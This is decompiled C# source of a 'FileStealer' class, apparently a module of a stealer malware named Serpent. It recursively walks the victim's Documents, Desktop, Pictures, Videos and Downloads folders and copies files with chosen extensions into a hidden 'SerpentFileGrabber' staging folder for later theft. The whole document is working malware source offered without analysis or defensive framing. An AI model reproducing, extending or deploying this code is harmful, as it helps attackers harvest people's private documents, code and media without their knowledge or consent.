using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;

namespace Modules
{
	// Token: 0x02000012 RID: 18
	[global::System.Runtime.CompilerServices.NullableContext(1)]
	[global::System.Runtime.CompilerServices.Nullable(0)]
	public class FileStealer
	{
		// Token: 0x0600001C RID: 28 RVA: 0x00003668 File Offset: 0x00001868
		private void StealDir(string A_1)
		{
			string text = this.Folders[1] + "\\SerpentFileGrabber";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(A_1))
			{
				try
				{
					Console.WriteLine("[+] Stealing " + A_1);
					string[] files = Directory.GetFiles(A_1);
					foreach (string text2 in Directory.GetDirectories(A_1))
					{
						this.StealDir(text2);
					}
					foreach (string text3 in files)
					{
						IEnumerable<string> supportedExtensions = this.SupportedExtensions;
						string text4 = text3;
						int length = text4.Length;
						int num = length - 3;
						if (supportedExtensions.Contains(text4.Substring(num, length - num)))
						{
							if (!Directory.Exists(text + "\\" + Path.GetExtension(text3)))
							{
								Directory.CreateDirectory(text + "\\" + Path.GetExtension(text3));
							}
							string text5 = text3;
							DefaultInterpolatedStringHandler defaultInterpolatedStringHandler = new DefaultInterpolatedStringHandler(21, 3);
							defaultInterpolatedStringHandler.AppendFormatted(this.Folders[1]);
							defaultInterpolatedStringHandler.AppendLiteral("\\SerpentFileGrabber\\");
							defaultInterpolatedStringHandler.AppendFormatted(Path.GetExtension(text3));
							defaultInterpolatedStringHandler.AppendLiteral("\\");
							defaultInterpolatedStringHandler.AppendFormatted(Path.GetFileName(text3));
							File.Copy(text5, defaultInterpolatedStringHandler.ToStringAndClear());
						}
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.Data);
				}
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000037D8 File Offset: 0x000019D8
		public void Run()
		{
			Console.WriteLine("[+] Executing File Stealer..");
			foreach (string text in this.Folders)
			{
				this.StealDir(text);
			}
		}

		// Token: 0x0400002D RID: 45
		public string[] Folders = new string[]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
		};

		// Token: 0x0400002E RID: 46
		public string[] SupportedExtensions = new string[]
		{
			"txt", "html", "php", "cs", "py", "json", "c", "cpp", "bat", "cmd",
			"css", "js", "odt", "mp3", "png", "mp4", "gif", "wav", "jpg", "jpeg",
			"nim"
		};
	}
}
